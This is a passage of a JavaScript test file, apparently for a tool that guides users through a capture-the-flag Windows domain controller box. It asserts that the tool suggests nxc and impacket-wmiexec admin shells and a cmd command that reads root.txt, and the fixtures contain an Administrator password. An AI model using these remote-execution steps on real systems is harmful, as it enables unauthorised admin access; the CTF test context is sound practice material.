    'WMI         ' + TGT + '   135    DC               [+] active.htb\\Administrator:Ticketmaster1968 (Pwn3d!)',
    'WMI         ' + TGT + '   135    DC               [+] Executed command via wmiexec',
    'WMI         ' + TGT + '   135    DC               C:\\Users\\Administrator\\Desktop\\root.txt'
  ].join('\n'));
  ok(step.actionId === 'flag-hunt-root-windows' && /nxc wmi.*Administrator.*root\*\.txt/.test(step.command) && S.factSetForTarget(TGT).has('access.admin'),
    '6.11 flag-hunt-root-windows jumps to #1 with remote nxc wmi probe, confirming Admin (Pwn3d!) and locating root.txt: ' + step.command);

  // Step 6.12: Once Admin is confirmed in 6.11, flag-hunt-root-windows switches to On-Host Shell and leads with impacket-wmiexec (since port 5985 is closed on Active)!
  step = runTopCommand([
    'Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies',
    '[*] SMBv2.1 dialect used',
    '[!] Launching semi-interactive shell - Careful what you execute',
    'C:\\>'
  ].join('\n'));
  ok(step.actionId === 'flag-hunt-root-windows' && /impacket-(wmiexec|psexec)/.test(step.command) && !/evil-winrm/.test(step.command),
    '6.12 flag-hunt-root-windows switches to On-Host Shell and leads with impacket-wmiexec to put the user on the host: ' + step.command);

  // Step 6.13: With the interactive shell open and root.txt already located, flag-hunt-root-windows promotes the universal in-session proof read (`cmd /c "whoami & hostname & ipconfig & type C:\Users\Administrator\Desktop\root.txt"`) with NO semicolons!
  step = runTopCommand([
    'active\\administrator',
    'DC',
    'IPv4 Address. . . . . . . . . . . : ' + TGT,
    'f0e1d2c3b4a5968778695a4b3c2d1e0f'
  ].join('\n'));
  ok(step.actionId === 'flag-hunt-root-windows' && step.command === 'cmd /c "whoami & hostname & ipconfig & type C:\\Users\\Administrator\\Desktop\\root.txt"' && !/;/.test(step.command) && S.factSetForTarget(TGT).has('objective.root_flag'),
    '6.13 flag-hunt-root-windows promotes universal cmd /c proof read (no semicolons) to #1 and novice captures root.txt on the host: ' + step.command);

  // Step 6.14: Verify Quick-Paste (no command line) of impacket-wmiexec banner mints access.desktop + access.admin, and combined user+root proof read mints both flags!
  const qpFacts = O.parsers.analyzeTerminal([
    'Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies',
    '[*] SMBv2.1 dialect used',
    '[!] Launching semi-interactive shell - Careful what you execute',
    '[!] Press help for extra shell commands',
    'C:\\>'
  ].join('\n'), { scope: 'host:' + TGT, source: 'quick-paste' }).facts;
  ok(qpFacts.some(f => f.kind === 'access.desktop' && f.value && f.value.session === 'wmiexec' && f.value.admin === true) && qpFacts.some(f => f.kind === 'access.admin'),
    '6.14 Quick-Paste of impacket-wmiexec banner (empty command) mints access.desktop (wmiexec, admin: true) and access.admin');

  const combFacts = O.parsers.analyzeTerminal([
    'C:\\>cmd /c "whoami & hostname & ipconfig & type C:\\Users\\SVC_TGS\\Desktop\\user.txt & type C:\\Users\\Administrator\\Desktop\\root.txt"',
    'active\\administrator',
    'DC',
    'Windows IP Configuration',
    '   IPv4 Address. . . . . . . . . . . : ' + TGT,
    '11111111222222223333333344444444',
    'aaaaaaaabbbbbbbbccccccccdddddddd'
  ].join('\n'), { scope: 'host:' + TGT, source: 'quick-paste' }).facts;
  ok(combFacts.some(f => f.kind === 'objective.local_flag' && f.value.flag === '11111111222222223333333344444444') &&
     combFacts.some(f => f.kind === 'objective.root_flag' && f.value.flag === 'aaaaaaaabbbbbbbbccccccccdddddddd'),
    '6.15 Combined user + root proof read mints both objective.local_flag and objective.root_flag in order');

  console.log('\nDRY-PROBE RECOVERY SMOKE: ' + pass + ' passed, ' + fail + ' failed');
  process.exit(fail ? 1 : 0);
})().catch(err => {
  console.error(err);
  process.exit(1);
});
